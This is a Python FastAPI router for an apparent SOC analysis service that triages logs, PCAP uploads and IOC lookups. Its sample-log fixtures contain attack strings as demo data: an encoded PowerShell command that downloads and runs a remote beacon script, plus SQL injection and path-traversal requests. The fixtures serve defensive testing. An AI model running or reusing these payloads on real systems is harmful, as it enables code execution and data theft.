import uuid
import os
import json
from pathlib import Path
from typing import Optional, Union
from fastapi import APIRouter, HTTPException, UploadFile, File, Query, Request, Body
from fastapi.responses import PlainTextResponse
from pydantic import BaseModel, Field
from app.services.analyzer import (
    analyze_threat,
    quick_ioc_lookup,
    parse_and_enrich_log_async,
    format_log_cli_report
)
from app.services.pcap_analyzer import (
    analyze_pcap_file,
    format_pcap_cli_report,
    TSharkNotFoundError,
    TSharkExecutionError
)
from app.services.unified_report import (
    UnifiedReportRequest,
    generate_unified_soc_report
)

router = APIRouter(prefix="/api", tags=["SOC Analysis"])

# Path direktori penyimpanan PCAP sementara
TEMP_PCAP_DIR = Path(__file__).resolve().parent.parent / "temp_pcap"
TEMP_PCAP_DIR.mkdir(parents=True, exist_ok=True)
ALLOWED_PCAP_EXTENSIONS = {".pcap", ".pcapng", ".cap"}
MAX_PCAP_SIZE_BYTES = 25 * 1024 * 1024  # Batas aman 25 MB

class IocLookupRequest(BaseModel):
    ioc: str = Field(..., min_length=1, description="IP, Domain, or Hash string to lookup")

SAMPLE_LOGS = {
    "cobalt_strike_c2": (
        "09/10/2026-15:30:12.102 [**] [1:2001219:19] ET MALWARE CobaltStrike Ingress Activity [**] "
        "[Classification: A Network Trojan was detected] [Priority: 1] {TCP} 192.168.1.50:49152 -> 185.220.101.5:8080 "
        "query=malicious-c2-node.xyz uri=/beacon.ps1 hash=e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
    ),
    "whitelist_scanner": (
        "2026-09-10T15:00:00Z host=scanner-internal src=10.0.0.50 dst=8.8.8.8 spt=45123 dpt=53 proto=UDP "
        "dns_query=windowsupdate.com info='Routine Nessus vulnerability check and Google DNS resolution'"
    ),
    "powershell_malware": (
        "2026-09-10T14:22:01.402Z host-workstation-04 Microsoft-Windows-Security-Auditing: 4688: "
        "A new process has been created. Creator: C:\\Windows\\System32\\cmd.exe. "
        "Process Command Line: powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADMALgAxADYAMQAuADAALgAyADAAOQA6ADgAMAA4ADAALwBiAGUAYQBjAG8AbgAuAHAAcwAxACcAKQA= "
        "Parent Process ID: 0x14f0. Suspicious Hash: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855 "
        "Destination IP: 193.161.0.209, Local Source: 192.168.1.45, Gateway: 10.0.0.1, CVE Reference: CVE-2024-21413"
    ),
    "web_attack": (
        "185.220.101.5 - - [10/Sep/2026:15:30:12 +0000] \"GET /admin/users.php?id=1' UNION SELECT 1,username,password FROM information_schema.tables-- HTTP/1.1\" 200 4522 \"https://malicious-c2-node.xyz\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) sqlmap/1.7.2\"\n"
        "185.220.101.5 - - [10/Sep/2026:15:30:15 +0000] \"GET /../../../../etc/passwd HTTP/1.1\" 403 210 \"-\" \"curl/7.88.1\""
    ),
    "siem_nids_sample": (
        "09/10/2026-15:30:12.102 [**] [1:2001219:19] ET MALWARE CobaltStrike Ingress Activity [**] "
        "[Classification: A Network Trojan was detected] [Priority: 1] {TCP} 192.168.1.50:49152 -> 185.220.101.5:8080\n"
        "CEF:0|Fortinet|FortiGate|7.0|0001|Traffic Log|5|src=192.168.1.50 dst=193.161.0.209 spt=51234 dpt=443 proto=TCP action=blocked hash=e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
    )
}

LOG_BODY_EXAMPLES = {
    "nids_suricata": {
        "summary": "NIDS Suricata / Snort Alert",
        "description": "Contoh log NIDS dengan alur panah IP:port -> IP:port",
        "value": (
            "09/10/2026-15:30:12.102 [**] [1:2001219:19] ET MALWARE CobaltStrike Ingress Activity [**] "
            "[Classification: A Network Trojan was detected] [Priority: 1] {TCP} 192.168.1.50:49152 -> 185.220.101.5:8080 "
            "hash=e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
        )
    },
    "cef_firewall": {
        "summary": "CEF Fortigate / Firewall Log",
        "description": "Contoh log format ArcSight/Fortigate Key-Value",
        "value": (
            "CEF:0|Fortinet|FortiGate|7.0|0001|Traffic Log|5|"
            "src=10.0.0.15 dst=193.161.0.209 spt=51234 dpt=443 proto=TCP action=blocked "
            "hash=e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
        )
    },
    "powershell_malware": {
        "summary": "Windows Event 4688 / PowerShell Attack",
        "description": "Contoh Windows Security Auditing dengan PowerShell encoded command",
        "value": (
            "2026-09-10T14:22:01.402Z host-workstation-04 Microsoft-Windows-Security-Auditing: 4688: "
            "Process Command Line: powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADMALgAxADYAMQAuADAALgAyADAAOQA6ADgAMAA4ADAALwBiAGUAYQBjAG8AbgAuAHAAcwAxACcAKQA= "
            "Destination IP: 193.161.0.209, Local Source: 192.168.1.45, Gateway: 10.0.0.1, Hash: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
        )
    }
}

def sanitize_and_clean_log(raw_log: str) -> str:
    """
    Membersihkan teks log mentah dan mendukung unboxing jika string berisi format JSON legasi.
    """
    clean_text = raw_log.strip()
    if not clean_text:
        raise HTTPException(
            status_code=400,
            detail="Body request kosong. Harap kirimkan teks log mentah (text/plain) di dalam body."
        )

    # Dukungan kompatibilitas mundur jika client mengirim JSON string seperti {"raw_log": "..."}
    if clean_text.startswith("{") and "raw_log" in clean_text:
        try:
            parsed = json.loads(clean_text)
            if isinstance(parsed, dict) and "raw_log" in parsed:
                clean_text = str(parsed["raw_log"]).strip()
        except Exception:
            pass

    return clean_text

@router.post("/parse-log")
async def parse_log_endpoint(
    raw_log: str = Body(
        ...,
        media_type="text/plain",
        description="Teks log mentah bertipe Plain Text (Syslog, NIDS/DPI, CEF, atau Windows Event Log).",
        openapi_examples=LOG_BODY_EXAMPLES
    ),
    format: str = Query("text", description="Format output: 'text' (default laporan terminal CLI) atau 'json'")
):
    """
    Endpoint utama untuk menganalisis log mentah (Plain Text / string) dan
    mengembalikan laporan teks terstruktur bergaya CLI/Terminal secara langsung.

    Komponen laporan mencakup:
    - Header Laporan (Judul Triage Log SIEM/NIDS)
    - Ringkasan Temuan (Skor ancaman, severity, total entitas ditemukan)
    - Daftar Entitas (IP Publik, IP Privat yang dilindungi, Domain, Hash, Sesi Aliran NIDS)
    - Rekomendasi Aksi Penanganan (Mitigasi keamanan & incident response)
    """
    log_content = sanitize_and_clean_log(raw_log)

    try:
        results = await parse_and_enrich_log_async(log_content)
        cli_report = format_log_cli_report(results, raw_log=log_content)

        if format.lower() == "json":
            return {
                "status": "success",
                "cli_report": cli_report,
                "data": results
            }

        return PlainTextResponse(content=cli_report, media_type="text/plain; charset=utf-8")
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Gagal memproses log: {str(e)}")

@router.post(
    "/analyze/log",
    response_class=PlainTextResponse,
    responses={
        200: {
            "content": {
                "text/plain": {"schema": {"type": "string"}},
                "application/json": {"schema": {"type": "object"}}
            },
            "description": "Laporan teks terstruktur bergaya CLI/Terminal (default) atau JSON terstruktur."
        }
    }
)
async def analyze_log_endpoint(
    raw_log: str = Body(
        ...,
        media_type="text/plain",
        description="Teks log mentah bertipe Plain Text untuk dianalisis (mendukung text/plain).",
        openapi_examples=LOG_BODY_EXAMPLES
    ),
    format: str = Query("text", description="Format output: 'text' (default laporan terminal CLI) atau 'json'")
):
    """
    Endpoint analisis log kompatibel yang merespons laporan teks terstruktur bergaya CLI/Terminal.
    """
    log_content = sanitize_and_clean_log(raw_log)

    try:
        results = await parse_and_enrich_log_async(log_content)
        cli_report = format_log_cli_report(results, raw_log=log_content)

        if format.lower() == "json":
            return {
                "status": "success",
                "cli_report": cli_report,
                "data": results
            }

        return PlainTextResponse(content=cli_report, media_type="text/plain; charset=utf-8")
    except Exception as e:
        try:
            results = analyze_threat(log_content)
            cli_report = format_log_cli_report(results, raw_log=log_content)
            if format.lower() == "json":
                return {"status": "success", "cli_report": cli_report, "data": results}
            return PlainTextResponse(content=cli_report, media_type="text/plain; charset=utf-8")
        except Exception:
            raise HTTPException(status_code=500, detail=f"Gagal memproses log: {str(e)}")

@router.post("/analyze-pcap")
async def analyze_pcap_endpoint(
    file: UploadFile = File(...),
    format: str = Query("text", description="Format output: 'text' (default CLI report) atau 'json'")
):
    """
    Menerima unggahan file .pcap atau .pcapng, menyimpan sementara di app/temp_pcap/ secara aman,
    mengekstraksi informasi esensial via CLI TShark, dan mengembalikan laporan teks bergaya CLI.
    """
    original_filename = file.filename or "traffic.pcap"
    file_ext = Path(original_filename).suffix.lower()

    if file_ext not in ALLOWED_PCAP_EXTENSIONS:
        raise HTTPException(
            status_code=400,
            detail=f"Format file '{file_ext}' tidak didukung. Harap unggah file dengan format .pcap atau .pcapng."
        )

    unique_name = f"upload_{uuid.uuid4().hex[:12]}{file_ext}"
    temp_file_path = TEMP_PCAP_DIR / unique_name

    try:
        total_bytes = 0
        with open(temp_file_path, "wb") as buffer:
            while chunk := await file.read(1024 * 1024):
                total_bytes += len(chunk)
                if total_bytes > MAX_PCAP_SIZE_BYTES:
                    raise HTTPException(
                        status_code=413,
                        detail="Ukuran file PCAP melebihi batas maksimum yang diizinkan (25 MB)."
                    )
                buffer.write(chunk)

        pcap_data = await analyze_pcap_file(temp_file_path)

        if format.lower() == "json":
            return {
                "status": "success",
                "file_info": {
                    "original_filename": original_filename,
                    "file_size_bytes": total_bytes
                },
                "data": pcap_data
            }

        cli_report = format_pcap_cli_report(pcap_data, original_filename, total_bytes)
        return PlainTextResponse(content=cli_report, media_type="text/plain; charset=utf-8")

    except TSharkNotFoundError as exc:
        raise HTTPException(
            status_code=503,
            detail=f"TShark CLI Not Installed: {str(exc)}"
        )
    except TSharkExecutionError as exc:
        raise HTTPException(
            status_code=422,
            detail=f"TShark Execution Failed: {str(exc)}"
        )
    except HTTPException:
        raise
    except Exception as exc:
        raise HTTPException(
            status_code=500,
            detail=f"Terjadi kesalahan saat menganalisis PCAP: {str(exc)}"
        )
    finally:
        if temp_file_path.exists():
            try:
                temp_file_path.unlink()
            except Exception:
                pass

@router.post(
    "/unified-report",
    responses={
        200: {
            "content": {
                "text/plain": {"schema": {"type": "string"}},
                "application/json": {"schema": {"type": "object"}}
            },
            "description": "Laporan teks investigasi terstruktur bergaya tiket L2 SOC profesional."
        }
    }
)
async def unified_report_endpoint(
    request: Request,
    payload: Optional[Union[UnifiedReportRequest, str]] = Body(
        None,
        description="Data multivariat dalam format JSON (UnifiedReportRequest) atau Plain Text mentah (Syslog, NIDS, DPI)"
    ),
    format: str = Query("text", description="Format output: 'text' (default tiket L2 SOC) atau 'json'")
):
    """
    Endpoint terpadu untuk menerima payload gabungan/multivariat:
    - Log SIEM/NIDS (Suricata, Snort, Zeek, CEF, Syslog)
    - Data sesi Arkime/DPI (Flow metadata, JA3, protocols)
    - Hasil analisis PCAP (Kueri DNS, HTTP Host/URI, Top Conversations)

    Meramunya menjadi laporan teks investigasi terstruktur bergaya tiket L2 SOC profesional:
    1. Executive Summary (Ringkasan alert, histori korelasi tiket sebelumnya, dan host terdampak)
    2. Detail Analysis (Kronologis temuan, korelasi jaringan, dan pembuktian forensik ekstraksi PCAP/DNS)
    3. Komponen Analisis (Tabel ringkas Source Host, Destination IP, Target Query, DNS Response Code, dan Reputasi VT)
    4. Kesimpulan & Justifikasi (Status akhir True Positive / False Positive beserta argumen teknis yang kuat)
    """
    req_obj: Optional[UnifiedReportRequest] = None

    if isinstance(payload, UnifiedReportRequest):
        req_obj = payload
    elif isinstance(payload, str):
        clean_text = payload.strip()
        if not clean_text:
            raise HTTPException(status_code=400, detail="Request body tidak boleh kosong.")
        if clean_text.startswith("{"):
            try:
                data_dict = json.loads(clean_text)
                if isinstance(data_dict, dict):
                    req_obj = UnifiedReportRequest(**data_dict)
            except Exception:
                pass
        if req_obj is None:
            req_obj = UnifiedReportRequest(
                alert_title="Raw Multi-Source Ingestion Alert",
                siem_log=clean_text
            )
    else:
        body_bytes = await request.body()
        body_text = body_bytes.decode("utf-8", errors="replace").strip()
        if not body_text:
            raise HTTPException(status_code=400, detail="Request body tidak boleh kosong.")
        if body_text.startswith("{"):
            try:
                data_dict = json.loads(body_text)
                if isinstance(data_dict, dict):
                    req_obj = UnifiedReportRequest(**data_dict)
            except Exception:
                pass
        if req_obj is None:
            req_obj = UnifiedReportRequest(
                alert_title="Raw Multi-Source Ingestion Alert",
                siem_log=body_text
            )

    try:
        report_text = generate_unified_soc_report(req_obj)

        if format.lower() == "json":
            return {
                "status": "success",
                "ticket_id": req_obj.ticket_id,
                "alert_title": req_obj.alert_title,
                "report": report_text,
                "request_payload": req_obj.model_dump()
            }

        return PlainTextResponse(content=report_text, media_type="text/plain; charset=utf-8")
    except Exception as exc:
        raise HTTPException(status_code=500, detail=f"Gagal menghasilkan laporan investigasi L2: {str(exc)}")

@router.post("/lookup/ioc")
async def lookup_ioc_endpoint(payload: IocLookupRequest):
    """Endpoint untuk lookup cepat reputasi / tipe IoC tunggal."""
    try:
        results = quick_ioc_lookup(payload.ioc)
        return {"status": "success", "data": results}
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Gagal memproses lookup IOC: {str(e)}")

@router.get("/sample-log/{log_type}")
async def get_sample_log(log_type: str):
    """Mengambil contoh data log mentah untuk mempermudah demonstrasi / testing."""
    if log_type not in SAMPLE_LOGS:
        return {"status": "error", "message": "Tipe sample tidak ditemukan", "available": list(SAMPLE_LOGS.keys())}
    return {"status": "success", "log_type": log_type, "content": SAMPLE_LOGS[log_type]}

@router.get("/health")
async def health_check():
    """Pemeriksaan status operasional service."""
    return {"status": "healthy", "service": "SOC Stateless Analysis Engine", "version": "1.4.0"}
